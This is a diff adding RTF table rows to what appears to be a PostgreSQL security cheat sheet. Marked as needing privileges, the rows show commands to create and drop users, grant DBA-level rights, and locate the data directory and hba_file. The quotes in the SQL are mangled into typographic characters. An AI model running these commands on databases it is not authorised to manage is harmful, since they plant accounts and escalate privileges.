+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Create Users\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 CREATE USER test1 PASSWORD \'91pass1\uc0\u8242 ; \'97 priv\
+CREATE USER test1 PASSWORD \'91pass1\uc0\u8242  CREATEUSER; \'97 priv, grant some privs at the same time\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Drop Users\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 DROP USER test1; \'97 priv\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Make User DBA\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 ALTER USER test1 CREATEUSER CREATEDB; \'97 priv\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 \'a0Location of DB files\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT current_setting(\'91data_directory\'92); \'97 priv\
+SELECT current_setting(\'91hba_file\'92); \'97 priv\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrt\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Default/System Databases\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 template0\
+template1\cell \lastrow\row
+}
